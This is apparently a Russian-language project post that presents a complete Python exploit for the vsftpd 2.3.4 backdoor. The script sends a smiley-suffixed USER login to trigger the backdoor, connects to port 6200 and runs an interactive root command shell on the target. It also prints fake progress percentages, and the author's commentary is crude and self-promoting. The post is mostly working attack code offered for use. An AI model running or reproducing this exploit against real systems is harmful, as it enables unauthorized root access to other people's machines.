## Проект №2 - Хуйня но не прям хуйня

Этот скрипт автоматически оправляет запросы на vsftpd. И работает только если vsftpd версии **2.3.4**. Поэтому делайте выводы, и смотрите скрипт:

```python
import time
import socket
import sys

if len(sys.argv) != 3:
        print(f"Use: python3 {sys.argv[0]} <Target_IP> <vsftpd_port>") 
        sys.exit(1)

target = sys.argv[1]
portnumber = sys.argv[2]

print("[!] Exploit to attack target with vsftpd 2.3.4 \n\n[Author] by Amniz1ya")
time.sleep(1.5)
print(f"\n[*] Start attack {target}...")

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(portnumber)))
        s.send(b"USER l:)\r\n")
        s.send(b"PASS L:)\r\n")
        s.close()
        time.sleep(1.5)
        print("\n[+] Get connect...\n")
        time.sleep(2.16)
        print(f"[*] Trying connect to {target}...\n")
        time.sleep(1.2)
        print("[*] 20%")
        time.sleep(1)
        print("[*] 40%")
        time.sleep(1) 
        print("[*] 60%")
        time.sleep(1)
        print("[*] 80%")
        time.sleep(1)
        print("[*] 99.9%..")
        time.sleep(2)
except Exception as e:
        print(f"[-] FTP connect Error {e}")
        sys.exit(1)

try:
        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        shell.connect((target, 6200))
        print("\n{+} Getting Root...")
        time.sleep(4)
        print("\n[+] Successfully!\n")
        while True:
                cmd = input(f"root@{target}# ")

                if cmd.lower() == 'exit':
                        break

                if cmd.strip() == '':
                        continue

                shell.send(f"{cmd}\n".encode('utf-8'))
                time.sleep(0.5)
                result = shell.recv(4096)

                print(result.decode('utf-8', errors='ignore'), end="")

        shell.close()
        print("\n[!] Connect end. Return")

except KeyboardInterrupt:
        print("\n\n[-] Connect end (Ctrl+C)")

except Exception as e:
        print(f"[-] Failed connect to backdoor: {e}")
```

НЕ вписать своё имя в этот скрипт я не мог, потому что конкретно заебался его писать. Если кто-то мне скажет что скрипт плох я заплачу
